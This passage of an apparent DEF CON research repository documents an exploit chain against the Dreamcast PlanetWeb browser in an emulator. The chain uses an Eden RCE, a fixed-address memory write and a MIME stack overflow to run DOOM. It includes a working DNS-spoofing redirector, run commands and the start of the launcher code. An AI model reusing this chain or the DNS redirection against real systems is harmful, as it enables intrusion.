@@ -1,0 +1,2909 @@
+Project Path: arc_piffd0s_Defcon-Dreamcast-Planetweb-Research_hs0no2oj
+
+Source Tree:
+
+```txt
+arc_piffd0s_Defcon-Dreamcast-Planetweb-Research_hs0no2oj
+├── .gitignore
+├── DREAMCAST_DOOM_NATIVE_HOWTO.md
+├── README.md
+├── build
+│   └── pwn_stagedoom.jar
+├── dns_redirect.py
+├── dreamcast_doom_native.py
+├── eden_mitm.py
+├── emu
+│   └── flycast-native
+│       └── Flycast.app
+│           └── Contents
+│               ├── Info.plist
+│               ├── MacOS
+│               │   └── Flycast
+│               ├── Resources
+│               │   ├── Images.xcassets
+│               │   │   └── AppIcon.appiconset
+│               │   │       └── Contents.json
+│               │   └── default.metallib
+│               └── _CodeSignature
+│                   └── CodeResources
+├── mail_poc.py
+├── patches
+│   └── flycast-picoppp-reap.patch
+├── src
+│   └── org
+│       └── junkyard
+│           ├── Junk.java
+│           └── StageDoom.java
+└── wad
+    └── doom1_trim.wad
+
+```
+
+`.gitignore`:
+
+```
+# This public repository intentionally contains only the native DOOM demo.
+# Everything else in the larger local research workspace stays local.
+*
+
+# Repository metadata and runtime entry points.
+!.gitignore
+!README.md
+!dreamcast_doom_native.py
+!dns_redirect.py
+!eden_mitm.py
+!mail_poc.py
+!DREAMCAST_DOOM_NATIVE_HOWTO.md
+
+# Exact payload artifacts consumed by dreamcast_doom_native.py.
+!build/
+build/*
+!build/pwn_stagedoom.jar
+!build/doom.bin
+!build/stub_native.bin
+
+# Source used by pwn_stagedoom.jar.
+!src/
+src/*
+!src/org/
+src/org/*
+!src/org/junkyard/
+src/org/junkyard/*
+!src/org/junkyard/Junk.java
+!src/org/junkyard/StageDoom.java
+
+# Flycast network-stack patch required by the staging route.
+!patches/
+patches/*
+!patches/flycast-picoppp-reap.patch
+
+# Dedicated built emulator. Mutable fchome and flash_baseline remain ignored.
+!emu/
+emu/*
+!emu/flycast-native/
+emu/flycast-native/*
+!emu/flycast-native/Flycast.app/
+!emu/flycast-native/Flycast.app/**
+
+# Exact WAD consumed by the launcher.
+!wad/
+wad/*
+!wad/doom1_trim.wad
+
+```
+
+`DREAMCAST_DOOM_NATIVE_HOWTO.md`:
+
+```md
+# Dreamcast PlanetWeb Native DOOM Demo
+
+This guide documents the files and host setup expected by `dreamcast_doom_native.py`. The launcher is macOS-specific and orchestrates a dedicated Flycast build, a DNS redirector, a rogue Eden HTTP service, and a POP3 server. It binds privileged ports, launches Flycast without GDB, stages the engine and WAD through the browser, plants the native loader stub, and triggers it when the prepared email is opened.
+
+Use this only with systems, software, and network environments you own or are authorized to test.
+
+## Direct file dependencies
+
+The following paths are resolved relative to the directory containing `dreamcast_doom_native.py` unless noted otherwise.
+
+| Path | Status | Purpose | Repo guidance |
+| --- | --- | --- | --- |
+| `dns_redirect.py` | Required | Redirects all guest DNS lookups to the host. | Include it. |
+| `eden_mitm.py` | Required | Serves the PlanetWeb Eden chain and payload files. | Include it. |
+| `mail_poc.py` | Required | Runs the POP3 service and constructs the MIME overflow email. | Include it. |
+| `build/pwn_stagedoom.jar` | Required | Java stage executed through the Eden subscription flaw. Its relevant Java sources are under `src/`. | Included as the exact tested runtime artifact. |
+| `build/doom.bin` | Required | Native SH-4 DOOM engine payload. | Included as the exact tested runtime artifact. |
+| `build/stub_native.bin` | Required | Native loader planted at `0x8C29ADE8`; it is coupled to the exact engine and WAD sizes. | Included as the exact tested runtime artifact. |
+| `wad/doom1_trim.wad` | Required | Renderable game-data WAD staged with the engine. | Included for this research/demo distribution; confirm redistribution rights before mirroring. |
+| `emu/flycast-native/Flycast.app/Contents/MacOS/Flycast` | Required | Dedicated signed arm64 Flycast executable used by this route. | Included as the exact tested app bundle. `patches/flycast-picoppp-reap.patch` records the required network change. |
+| Dreamcast PlanetWeb `.gdi` and every track named by it | Required, external path | Browser disc image. Defaults to a path under `~/Downloads`; override with `DISC`. | Do not commit unless you have distribution rights. The `.gdi` alone is insufficient—keep its referenced track files beside it. |
+| `name_payload.hex` | Optional | Overrides the email payload generated from `MAIL_PC`. If present, its final four bytes must decode little-endian to `0x8C29ADE8`. | Usually omit it and let the launcher pass `MAIL_PC=8C29ADE8` to `mail_poc.py`. |
+
+The executable checks the nine required entries above at startup. The three companion services use only the Python standard library. For the `stagedoom` route, `eden_mitm.py` additionally selects the four payload entries already listed (`pwn_stagedoom.jar`, `doom.bin`, `stub_native.bin`, and `doom1_trim.wad`). `mail_poc.py` optionally reads `mail_subject.txt`, `name_payload.hex`, and `doom_blob.txt`; none is required because it has built-in defaults and this launcher supplies the return address through the environment. `www/`, fuzz corpora, and the other chain JARs are not dependencies of this route.
+
+### Filename discrepancy resolved
+
+The launcher requires `build/stub_native.bin`; its docstring and status output now use that filename consistently. `build/stub.bin` belongs to a different demo.
+
+### Stub/WAD coupling
+
+`build/stub_native.bin` bakes the byte sizes of `build/doom.bin` and `wad/doom1_trim.wad` into the loader. The repository contains the matched, tested trio. Do not replace either payload independently; regenerate and publish all coupled artifacts together.
+
+## Runtime state and configuration
+
+These paths are not in the launcher's startup check, but they matter for a reproducible demo:
+
+| Path | Role |
+| --- | --- |
+| `emu/fchome/` | Isolated `HOME` used when Flycast is launched. |
+| `emu/fchome/.flycast/data/` | Flycast log, firmware/NVRAM, VMU saves, configuration, and temporary save states. |
+| `emu/flash_baseline/` | Clean copies restored before each launch. Created automatically from files already present in Flycast's data directory. |
+
+The launcher recognizes these persistent files when present:
+
+- `dc_nvmem.bin`
+- `dc_flash.bin`
+- `T31901N_vmu_save_A1.bin`
+- `vmu_save_A2.bin`
+
+For a public repository, commit only sanitized state you are legally permitted to distribute. Do not publish firmware, personal mail settings, credentials, cookies, or unique console data. A safer repository contains setup instructions or a provisioning script and keeps local state ignored.
+
+The repository-root `.gitignore` is an allowlist for this demo. It excludes mutable emulator state, firmware, browser disc images, unrelated research, and local tooling. `emu/fchome/` and `emu/flash_baseline/` are intentionally local even though their directory positions appear in the layout.
+
+```gitignore
+emu/fchome/
+emu/flash_baseline/
+*.state
+*.log
+__pycache__/
+*.py[cod]
+```
+
+If the demo relies on a carefully preconfigured, sanitized browser flash/VMU baseline, store it as a separately controlled demo artifact rather than assuming a fresh checkout has it.
+
+## Recommended repository layout
+
+```text
+.
+├── dreamcast_doom_native.py
+├── dns_redirect.py
+├── eden_mitm.py
+├── mail_poc.py
+├── DREAMCAST_DOOM_NATIVE_HOWTO.md
+├── build/
+│   ├── pwn_stagedoom.jar
+│   ├── doom.bin
+│   └── stub_native.bin
+├── src/                         # recommended: sources for the three build artifacts
+├── patches/
+│   └── flycast-picoppp-reap.patch
+├── emu/
+│   ├── flycast-native/
+│   │   └── Flycast.app/
+│   ├── fchome/                  # normally local/ignored
+│   └── flash_baseline/          # normally local/ignored
+└── wad/
+    └── doom1_trim.wad
+```
+
+The public repository intentionally contains this demo only. Broader exploit research, local toolchains, firmware, build worktrees, and emulator profiles remain outside the Git tree.
+
+## Host requirements
+
+- macOS. The launcher depends on a `.app` bundle and the macOS commands `defaults`, `ipconfig`, `ifconfig`, `route`, `stat`, and `caffeinate`.
+- Python 3. The launcher itself uses only the standard library, so it does not need a `requirements.txt`.
+- Root privileges to bind TCP/UDP port 53, TCP port 80, and TCP port 110.
+- A dedicated Flycast build at the exact path shown above, produced from the pinned source and checked-in patches described above.
+- A configured isolated Flycast home with any required firmware and PlanetWeb network/mail settings.
+- A host interface reachable from the emulated Dreamcast network.
+- Ports 53, 80, and 110 free before launch.
+
+The companion Python services use only the standard library. Their route-specific optional files are covered in the dependency audit above.
+
+## Initial setup
+
+1. Place `dreamcast_doom_native.py` at the repository root with the three companion Python services.
+
+2. Build or obtain the three payload artifacts and place them at their exact paths:
+
+   ```text
+   build/pwn_stagedoom.jar
+   build/doom.bin
+   build/stub_native.bin
+   ```
+
+3. Supply `wad/doom1_trim.wad`. Confirm that the engine-compatible WAD contains the assets the script comments call out, including `TITLEPIC` and sprites.
+
+4. The dedicated, signed Flycast app is included at:
+
+   ```text
+   emu/flycast-native/Flycast.app
+   ```
+
+   Keep this copy separate from other Flycast installations. The corresponding source change is recorded in `patches/flycast-picoppp-reap.patch`.
+
+5. Create and configure the isolated Flycast home at `emu/fchome`. Launch the dedicated build against that home long enough to configure the browser's emulated network and POP3 account. The launcher expects the browser to contact Eden when it goes online and the mail client to retrieve from the host POP3 service.
+
+6. Shut Flycast down cleanly. On the first scripted run, the launcher copies recognized flash/VMU files from `emu/fchome/.flycast/data/` into `emu/flash_baseline/`. Start from a known-good, sanitized configuration.
+
+7. Keep the PlanetWeb `.gdi` and all tracks referenced by it together outside the repository. The default location is:
+
+   ```text
+   ~/Downloads/Internet Browser V3.0 for Dreamcast (USA)/
+   ```
+
+   A different location can be supplied with `DISC`.
+
+8. Do not create `name_payload.hex` unless you intentionally need a fixed payload. If it exists, verify that its last four bytes represent `0x8C29ADE8` in little-endian order.
+
+## Preflight checks
+
+From the repository root:
+
+```bash
+python3 -m py_compile dreamcast_doom_native.py dns_redirect.py eden_mitm.py mail_poc.py
+
+test -x emu/flycast-native/Flycast.app/Contents/MacOS/Flycast
+test -f build/pwn_stagedoom.jar
+test -f build/doom.bin
+test -f build/stub_native.bin
+test -f wad/doom1_trim.wad
+
+sudo lsof -nP -iUDP:53 -iTCP:53 -iTCP:80 -iTCP:110
+```
+
+The final command should not show an unrelated listener on a required port. The launcher attempts to stop stale copies of its own services and any process named `Flycast`, but it will not resolve every possible port conflict.
+
+## Run the demo
+
+When automatic host-IP detection and the default disc path are correct:
+
+```bash
+sudo python3 dreamcast_doom_native.py
+```
+
+For an explicit disc and host address, pass them through `sudo` deliberately:
+
+```bash
+sudo env \
+  DISC="/absolute/path/to/Internet Browser V3.0 for Dreamcast (USA).gdi" \
+  HOST_IP="192.0.0.2" \
+  python3 dreamcast_doom_native.py
+```
+
+Using `sudo env` avoids relying on whether the local `sudo` configuration preserves shell environment variables.
+
+The launcher then:
+
+1. Stops stale demo services and Flycast processes.
+2. Restores the clean flash/VMU baseline.
+3. Starts `caffeinate` to keep the Mac awake.
+4. Starts DNS redirection, Eden HTTP, and POP3 services.
+5. Starts Flycast with networking enabled and the GDB server disabled.
+
+Inside PlanetWeb:
+
+1. Use `A` three times, choose **Start**, and enter the web browser.
+2. Let the browser connect. Do not navigate elsewhere and do not open Mail yet.
+3. Watch the terminal as the Eden chain serves the JAR, engine, WAD, and loader stub.
+4. Wait for the terminal to print `ARMED`.
+5. Open **Mail**, choose **Check Mail**, and open the `DOOM-STAGE` message promptly.
+
+Opening the message before `ARMED` can make the saved-return-address jump occur before the loader is planted.
+
+Press `Ctrl-C` to stop the DNS, Eden, POP3, and Flycast processes and restore the terminal state.
+
+## Environment variables
+
+| Variable | Meaning |
+| --- | --- |
+| `DISC` | Absolute path to the PlanetWeb `.gdi`. |
+| `HOST_IP` | Host IPv4 address reachable by the emulated guest; use this when auto-detection is wrong. |
+| `RECAPTURE=1` | Replaces the current flash/VMU baseline with recognized files from the configured Flycast data directory. Use only after confirming the current state is clean and correct. |
+
+`MAIL_PC` and `MAIL_PAD` are set internally for `mail_poc.py` to `8C29ADE8` and `64`; they are not intended as normal operator overrides in this launcher.
+
+## Logs
+
+| Path | Contents |
+| --- | --- |
+| `/tmp/demo_dns.log` | DNS redirector output. |
+| `/tmp/eden_native.log` | Eden requests, payload streaming, chunk progress, and heap-stage confirmation. |
+| `/tmp/mail_native.log` | POP3 activity, including `RETR` or `TOP`. |
+| `emu/fchome/.flycast/data/flycast.log` | Flycast boot and emulator log. |
+
+These files are overwritten at service launch or Flycast boot.
+
+## Troubleshooting
+
+### `missing required file`
+
+Use the path printed by the launcher. Remember that the actual stub filename is `build/stub_native.bin`, not `build/stub.bin`.
+
+### `HOST_IP resolved to loopback`
+
+The guest cannot reach `127.0.0.1`. Rerun with a reachable interface address:
+
+```bash
+sudo env HOST_IP="192.0.0.2" DISC="/absolute/path/browser.gdi" \
+  python3 dreamcast_doom_native.py
+```
+
+### A server cannot bind its port
+
+Check for other DNS, HTTP, or POP3 listeners:
+
+```bash
+sudo lsof -nP -iUDP:53 -iTCP:53 -iTCP:80 -iTCP:110
+```
+
+Stop or reconfigure the conflicting service. The port constants are fixed in the launcher and must also agree with the guest configuration and companion services.
+
+### The browser connects but the chain never arms
+
+- Inspect `/tmp/eden_native.log` and `/tmp/demo_dns.log`.
+- Confirm the guest is using `HOST_IP` for DNS.
+- Confirm `eden_mitm.py --chain stagedoom` recognizes and serves the expected paths.
+- Keep the host awake and Flycast in the foreground while the multi-megabyte staging stream completes.
+- Verify that the included dedicated Flycast build—not another installation—is being launched.
+
+### `name_payload.hex targets ... not the stub`
+
+Delete `name_payload.hex` so `MAIL_PC=8C29ADE8` is used, or regenerate it with the correct little-endian saved-return-address value.
+
+### Flycast repeatedly reports the RAM-reservation race
+
+The launcher retries up to 12 times when `flycast.log` contains `Verify Failed`. Inspect `emu/fchome/.flycast/data/flycast.log` if all retries fail.
+
+### The email is fetched but DOOM does not start
+
+- Confirm that the terminal printed `ARMED` before the message was opened.
+- Check `/tmp/mail_native.log` for `RETR` or `TOP`.
+- Re-stage the payload, then reopen the message promptly; the staged blob resides in the JVM heap and can be overwritten by later browser activity.
+- Confirm that `build/stub_native.bin` was built for the exact engine/WAD combination being served.
+
+## Completing the dependency audit
+
+Once the companion scripts and source tree are present, use this from the repository root to find likely transitive files and external commands:
+
+```bash
+rg -n \
+  '^(from|import) |open\(|Path\(|os\.path|subprocess|Popen|check_output|\.jar|\.bin|\.wad|\.conf|\.patch' \
+  dreamcast_doom_native.py dns_redirect.py eden_mitm.py mail_poc.py src patches
+```
+
+Review dynamic paths and server route handlers manually. In particular, verify which files `eden_mitm.py` serves for `--chain stagedoom` and whether `mail_poc.py` loads templates or payload files beyond the optional `name_payload.hex`.
+
+```
+
+`README.md`:
+
+```md
+# Dreamcast PlanetWeb Native DOOM Demo
+
+This repository contains the minimal, tested files for launching native SH-4 DOOM through Sega Dreamcast PlanetWeb Internet Browser v3.0. The demo chains the browser's Eden service loading behavior, a native `setRawDeviceID` memory-write flaw, and a MIME attachment stack overflow. It runs without attaching a debugger or using GDB to stage the payload.
+
+Use this project only with systems, software, and networks you own or are explicitly authorized to test.
+
+## What is included
+
+- `dreamcast_doom_native.py` — coordinates DNS, Eden HTTP, POP3, Flycast, staging, and cleanup.
+- `dns_redirect.py`, `eden_mitm.py`, `mail_poc.py` — the three local services used by the chain.
+- `build/` — the exact tested Java stage, native DOOM engine, and native loader stub.
+- `src/` — the relevant Java source for the staged service.
+- `patches/flycast-picoppp-reap.patch` — reduces picoTCP connection linger so payload staging can finish reliably.
+- `emu/flycast-native/Flycast.app` — the dedicated signed Apple Silicon Flycast build used by the launcher.
+- `wad/doom1_trim.wad` — the WAD matched to the size-baked loader stub.
+
+For the complete dependency audit, setup details, operating sequence, and troubleshooting, read [DREAMCAST_DOOM_NATIVE_HOWTO.md](DREAMCAST_DOOM_NATIVE_HOWTO.md).
+
+## Requirements
+
+- macOS on Apple Silicon. The included Flycast executable is arm64.
+- Python 3; the Python programs use only the standard library.
+- Administrator access. The launcher binds DNS port 53, HTTP port 80, and POP3 port 110.
+- A legally obtained PlanetWeb Internet Browser v3.0 `.gdi` and every track referenced by it.
+- A configured local Flycast home at `emu/fchome/`. This mutable directory is intentionally not committed.
+- A host IPv4 address reachable from Flycast's emulated Dreamcast network.
+
+## Disc layout
+
+Keep the browser disc descriptor and all its track files together outside the repository. The launcher's default is:
+
+```text
+~/Downloads/Internet Browser V3.0 for Dreamcast (USA)/
+└── Internet Browser V3.0 for Dreamcast (USA).gdi
+```
+
+Set `DISC` to use another location.
+
+## Preflight
+
+From the repository root:
+
+```bash
+python3 -m py_compile \
+  dreamcast_doom_native.py dns_redirect.py eden_mitm.py mail_poc.py
+
+test -x emu/flycast-native/Flycast.app/Contents/MacOS/Flycast
+test -f build/pwn_stagedoom.jar
+test -f build/doom.bin
+test -f build/stub_native.bin
+test -f wad/doom1_trim.wad
+```
+
+The committed `doom.bin`, `stub_native.bin`, and `doom1_trim.wad` are a matched set. The loader stub contains the engine and WAD sizes; do not replace only one of these files.
+
+## Run
+
+When the default disc path and automatic host-IP detection are correct:
+
+```bash
+sudo python3 dreamcast_doom_native.py
+```
+
+To specify both explicitly:
+
+```bash
+sudo env \
+  DISC="/absolute/path/to/Internet Browser V3.0 for Dreamcast (USA).gdi" \
+  HOST_IP="192.0.0.2" \
+  python3 dreamcast_doom_native.py
+```
+
+Then:
+
+1. In PlanetWeb, press `A` three times, choose **Start**, and enter the web browser.
+2. Let the browser connect and leave it on the browser screen. Do not open Mail yet.
+3. Wait for the terminal to report `ARMED`.
+4. Open **Mail**, choose **Check Mail**, and promptly open the `DOOM-STAGE` message.
+5. Press `Ctrl-C` in the terminal to stop the services and emulator.
+
+Opening the message before `ARMED` can trigger the return-address overwrite before the loader has been planted.
+
+## Repository layout
+
+```text
+.
+├── README.md
+├── DREAMCAST_DOOM_NATIVE_HOWTO.md
+├── dreamcast_doom_native.py
+├── dns_redirect.py
+├── eden_mitm.py
+├── mail_poc.py
+├── build/
+│   ├── pwn_stagedoom.jar
+│   ├── doom.bin
+│   └── stub_native.bin
+├── src/org/junkyard/
+│   ├── Junk.java
+│   └── StageDoom.java
+├── patches/
+│   └── flycast-picoppp-reap.patch
+├── emu/flycast-native/Flycast.app/
+└── wad/
+    └── doom1_trim.wad
+```
+
+Local emulator profiles, firmware, flash/VMU state, disc images, toolchains, logs, and unrelated research are excluded by the repository allowlist.
+
+```
+
+`dns_redirect.py`:
+
+```py
+#!/usr/bin/env python3
+"""
+dns_redirect.py -- answer DNS A queries for the dead Planetweb hosts with YOUR
+server IP, so the emulated Dreamcast's browser connects to the rogue Eden server.
+
+Point Flycast's (or the browser profile's) DNS at the box running this, then run
+eden_mitm.py on :80. Needs root for :53.
+
+  sudo python3 dns_redirect.py <YOUR_IP> [--all]
+    <YOUR_IP>  the IP of the machine running eden_mitm.py
+    --all      answer EVERY query with YOUR_IP (default: only *.planetweb.com)
+"""
+import socket, struct, sys
+
+if len(sys.argv) < 2:
+    sys.exit("usage: sudo python3 dns_redirect.py <YOUR_IP> [--all]")
+IP = sys.argv[1]
+ALL = "--all" in sys.argv
+IPB = bytes(int(x) for x in IP.split("."))
+
+def qname(data, off):
+    parts = []
+    while True:
+        n = data[off]
+        if n == 0: off += 1; break
+        parts.append(data[off+1:off+1+n].decode("latin1")); off += 1 + n
+    return ".".join(parts), off
+
+# bind to the target IP itself (not 0.0.0.0) so we don't clash with libvirt's
+# dnsmasq on other interface IPs; the guest's DNS is set to this IP anyway.
+BIND = IP
+for a in sys.argv[2:]:
+    if a.startswith("--bind="): BIND = a.split("=", 1)[1]
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((BIND, 53))
+print("DNS redirector on %s:53 -> %s (%s)" % (BIND, IP, "ALL names" if ALL else "*.planetweb.com only"))
+while True:
+    data, addr = s.recvfrom(512)
+    try:
+        tid = data[:2]
+        name, end = qname(data, 12)
+        qtype = struct.unpack(">H", data[end:end+2])[0]
+        hit = ALL or name.endswith("planetweb.com")
+        print("  query %-40s %s" % (name, "-> " + IP if hit else "(ignored)"))
+        if not hit or qtype != 1:
+            continue
+        # response: flags=0x8180, QD=1, AN=1
+        resp = tid + b"\x81\x80" + b"\x00\x01\x00\x01\x00\x00\x00\x00"
+        resp += data[12:end+4]                       # echo question
+        resp += b"\xc0\x0c" + b"\x00\x01\x00\x01"    # name ptr, type A, class IN
+        resp += b"\x00\x00\x00\x3c"                  # TTL 60
+        resp += b"\x00\x04" + IPB                    # rdlength 4 + IP
+        s.sendto(resp, addr)
+    except Exception as e:
+        print("  err:", e)
+
+```
+
+`dreamcast_doom_native.py`:
+
+```py
+#!/usr/bin/env python3
+"""
+dreamcast_doom_native.py -- one-command DEF CON demo:
+    Dreamcast PlanetWeb browser  ->  Eden RCE plants a stub (setRawDeviceID)
+                                 ->  email MIME overflow jumps to it  ->  native SH-4 DOOM.
+
+    sudo python3 dreamcast_doom_native.py
+
+The **fully on-device** DOOM chain -- NO GDB, no debugger, no host staging. Every byte is
+delivered by content we serve (a rogue Eden server + a rogue POP3 server) and by the console's
+own bugs. Three real bugs, chained:
+
+  Bug #1  Eden service-subscription RCE  -> the browser goes online, phones home to
+          eden.planetweb.com (us), and runs our unsigned JAR (StageDoom) with no
+          SecurityManager. That Java is the ONLY way to reach the next bug.
+  Bug #3  setRawDeviceID (native cmd 100) -> StageDoom's Java does an unbounded memcpy to
+          the FIXED address 0x8C29ABE6, planting a tiny native loader stub at 0x8C29ADE8.
+          It also HTTP-streams doom.bin + WAD into a JVM-heap byte[] tagged "DOOMSTG1".
+  Bug #2  MIME name= stack overflow -> opening our DOOM-STAGE email overwrites the saved
+          return address with 0x8C29ADE8 and returns straight into the planted stub, which
+          scans the heap for the magic, relocates the engine + WAD, and jumps -> DOOM.
+
+Why this instead of the GDB demo (dreamcast_doom.py)? No debugger anywhere -- nothing halts
+the guest, nothing to hand-wave. The tradeoff: the ~3.8 MB payload lives in the JVM heap
+between staging and email-open, so open the message promptly once the chain arms (below).
+
+Leaves dreamcast_doom.py (the proven GDB demo) completely untouched -- run either one.
+
+Requires root (binds :53, :80, :110). Prereqs already built: build/pwn_stagedoom.jar,
+build/doom.bin, build/stub_native.bin, wad/doom1_trim.wad.
+"""
+
+import os, sys, time, socket, struct, subprocess, threading, signal, re
+
+ROOT     = os.path.dirname(os.path.abspath(__file__))
+# A dedicated Flycast used only by this no-GDB demo. The tested signed app is included under
+# emu/flycast-native/; patches/flycast-picoppp-reap.patch records its required network change.
+FLYCAST  = os.path.join(ROOT, "emu/flycast-native/Flycast.app/Contents/MacOS/Flycast")
+FCHOME   = os.path.join(ROOT, "emu/fchome")
+FCLOG    = os.path.join(FCHOME, ".flycast/data/flycast.log")
+FCDATA   = os.path.join(FCHOME, ".flycast/data")
+# pristine, already-configured flash+VMU shared by all demos, restored before every launch so
+# no state (Eden subscription, cached page, cookie, last URL, read-mail flags) leaks between runs.
+BASELINE = os.path.join(ROOT, "emu", "flash_baseline")
+PERSIST  = ("dc_nvmem.bin", "dc_flash.bin", "T31901N_vmu_save_A1.bin", "vmu_save_A2.bin")
+DNS_PY   = os.path.join(ROOT, "dns_redirect.py")
+EDEN_PY  = os.path.join(ROOT, "eden_mitm.py")
+MAIL_PY  = os.path.join(ROOT, "mail_poc.py")
+
+STAGE_JAR = os.path.join(ROOT, "build/pwn_stagedoom.jar")
+DOOM_BIN  = os.path.join(ROOT, "build/doom.bin")
+# Renderable payload: doom1_trim is the only WAD with TITLEPIC + sprites (the engine I_Errors
+# without them, and we can't recompile it -- no SH-4 toolchain). The 3.8MB stream is made
+# reliable by StageDoom's 256KB chunks (few picoppp connections), not by shrinking the WAD.
+# build_stage_native.py bakes stub_native.bin for THIS wad; eden serves both only for
+# --chain stagedoom (GDB demo + its build/stub.bin untouched).
+STUB_BIN  = os.path.join(ROOT, "build/stub_native.bin")
+WAD_FILE  = os.path.join(ROOT, "wad/doom1_trim.wad")
+
+EDEN_LOG = "/tmp/eden_native.log"
+MAIL_LOG = "/tmp/mail_native.log"
+DNS_LOG  = "/tmp/demo_dns.log"
+EDEN_PORT = 80
+POP_PORT  = 110
+
+STUB_ADDR = 0x8C29ADE8           # planted by setRawDeviceID; the email's saved-PR points here
+MAIL_PC   = "%08X" % STUB_ADDR    # 4-byte saved-PR overwrite (hex); bytes 8C/29/AD/E8, all copy-safe
+MAIL_PAD  = "64"                  # bytes before the saved-PR slot
+
+# NOTE: this demo NEVER starts or connects to a GDB stub. That is the whole point -- the payload
+# is delivered by Bug #1 + Bug #3 and triggered by Bug #2, entirely on-device. Flycast is launched
+# with the GDB server OFF, so nothing can halt the guest mid-boot.
+
+# the browser disc (override with DISC=/path)
+DISC = os.environ.get("DISC",
+    os.path.expanduser("~/Downloads/Internet Browser V3.0 for Dreamcast (USA)/"
+                       "Internet Browser V3.0 for Dreamcast (USA).gdi"))
+
+FLYCAST_ATTEMPTS = 12
+
+G="\033[92m"; Y="\033[93m"; R="\033[91m"; B="\033[1m"; X="\033[0m"
+def say(m):  print("   " + m, flush=True)
+def hdr(m):  print("\n" + G + "="*66 + "\n== " + m + "\n" + "="*66 + X, flush=True)
+def warn(m): print(R + "!! " + m + X, flush=True, file=sys.stderr)
+
+def fix_tty():
+    """Launching Flycast under sudo leaves the controlling TTY in raw mode (onlcr off), so
+    every line printed afterward staircases down the screen. Restore cooked mode."""
+    try:
+        if sys.stdout.isatty():
+            subprocess.run(["stty", "sane"], stderr=subprocess.DEVNULL)
+    except Exception: pass
+
+procs = []
+
+def _iface_inet(iface):
+    """The IPv4 on an interface, however it was assigned (ipconfig getifaddr only reports
+    DHCP leases -- a tethered/hotspot/static address like 192.0.0.2 needs the ifconfig fallback)."""
+    try:
+        a = subprocess.check_output(["ipconfig","getifaddr",iface], text=True).strip()
+        if a: return a
+    except Exception: pass
+    try:
+        for l in subprocess.check_output(["ifconfig",iface], text=True).splitlines():
+            l=l.strip()
+            if l.startswith("inet ") and not l.split()[1].startswith("127."):
+                return l.split()[1]
+    except Exception: pass
+    return ""
+
+def host_ip():
+    if os.environ.get("HOST_IP"): return os.environ["HOST_IP"]
+    # 1) the default-route interface (works for static/tethered/hotspot/DHCP alike)
+    try:
+        dev = subprocess.check_output(["route","-n","get","default"], text=True)
+        iface = next(l.split()[-1] for l in dev.splitlines() if "interface:" in l)
+        a = _iface_inet(iface)
+        if a: return a
+    except Exception: pass
+    # 2) any physical en* address (skip loopback + tailscale/CGNAT 100.x)
+    try:
+        cur=None
+        for l in subprocess.check_output(["ifconfig"], text=True).splitlines():
+            if l and not l[0].isspace(): cur=l.split(":")[0]
+            s=l.strip()
+            if s.startswith("inet ") and cur and cur.startswith("en"):
+                ip=s.split()[1]
+                if not ip.startswith("127.") and not ip.startswith("100."):
+                    return ip
+    except Exception: pass
+    return "127.0.0.1"
+
+def real_user():
+    return os.environ.get("SUDO_USER") or subprocess.check_output(
+        ["stat","-f%Su","/dev/console"], text=True).strip()
+
+def kill_stale():
+    """Reap leftovers from ANY demo so ports free up and only one runs at a time. We run as
+    root; protect our own pid/parent/process-group so we never kill ourselves."""
+    me=os.getpid(); parent=os.getppid()
+    try: my_pgid=os.getpgid(0)
+    except Exception: my_pgid=-1
+    protected={me,parent,0}
+    def reap(pat,label):
+        try: out=subprocess.check_output(["pgrep","-f",pat],text=True).split()
+        except subprocess.CalledProcessError: out=[]
+        for s in out:
+            pid=int(s)
+            if pid in protected: continue
+            try:
+                if os.getpgid(pid)==my_pgid: continue
+            except Exception: pass
+            try: os.kill(pid, signal.SIGTERM); say("reaped stale %s (pid %d)"%(label,pid))
+            except Exception: pass
+    for n in ("dns_redirect.py","eden_mitm.py","mail_poc.py","dreamcast_calc.py",
+              "dreamcast_doom.py","dreamcast_doom_native.py","doom_demo_1.py"):
+        reap(n,n)
+    try:
+        for s in subprocess.check_output(["pgrep","-x","Flycast"],text=True).split():
+            try: os.kill(int(s),signal.SIGTERM); say("reaped stale Flycast (pid %s)"%s)
+            except Exception: pass
+    except subprocess.CalledProcessError: pass
+    time.sleep(2)
+
+def reset_flash():
+    """Restore the pristine, pre-configured flash+VMU so this demo starts exactly like every
+    other -- no Eden subscription, cached page, cookie, or read-mail flag carried over. The
+    baseline keeps the network + email config, so nothing is wiped. Captures on first run;
+    RECAPTURE=1 forces a fresh capture from a known-good state."""
+    import shutil
+    os.makedirs(BASELINE, exist_ok=True)
+    present = [f for f in PERSIST if os.path.exists(os.path.join(FCDATA, f))]
+    have = present and all(os.path.exists(os.path.join(BASELINE, f)) for f in present)
+    if os.environ.get("RECAPTURE") == "1" or not have:
+        n = 0
+        for f in present:
+            shutil.copy2(os.path.join(FCDATA, f), os.path.join(BASELINE, f)); n += 1
+        say("captured clean flash/VMU baseline (%d files) -- future runs reset to this" % n)
+        return
+    n = 0
+    for f in present:
+        b = os.path.join(BASELINE, f)
+        if os.path.exists(b):
+            shutil.copy2(b, os.path.join(FCDATA, f)); n += 1
+    say("reset to clean browser (%d files) -- no subscription/cache/read-mail from a prior demo" % n)
+
+def cleanup(*_):
+    print()
+    for _,p in procs:
+        if p.poll() is None:
+            try: p.terminate()
+            except Exception: pass
+    subprocess.run(["pkill","-TERM","-x","Flycast"], stderr=subprocess.DEVNULL)
+    fix_tty()   # restore cooked mode so the shell isn't left staircasing after we exit
+    say("stopped DNS + Eden + POP3 + emulator")
+    os._exit(0)
+
+# ---- boot (NO GDB -- a debugger connect/halt pauses the guest mid-boot; we never touch one) ----
+def launch_flycast(ip):
+    """Cold boot with the GDB server OFF. Retry ONLY the vmem-reservation race, detectable from
+    the log ('Verify Failed') with no debugger. Nothing here ever opens or connects to a GDB
+    stub -- this whole chain is on-device, so there is no reason to."""
+    user=real_user(); os.makedirs(FCDATA, exist_ok=True)
+    for f in (os.listdir(FCDATA) if os.path.isdir(FCDATA) else []):
+        if f.endswith(".state"):
+            try: os.remove(os.path.join(FCDATA,f))
+            except Exception: pass
+    reset_flash()   # identical clean browser every launch (see reset_flash docstring)
+    subprocess.run(["sudo","-u",user,"defaults","write","com.flyinghead.Flycast",
+                    "ApplePersistenceIgnoreState","-bool","YES"],
+                   stderr=subprocess.DEVNULL, env=dict(os.environ, HOME=FCHOME))
+    args=["sudo","-u",user,"env","HOME="+FCHOME, FLYCAST,
+          "-config","log:LogToFile=yes",
+          "-config","config:Debug.GDBEnabled=no",     # <- GDB server OFF, always
+          "-config","network:Enable=yes",
+          "-config","network:DCNet=no",
+          "-config","network:EmulateBBA=yes",
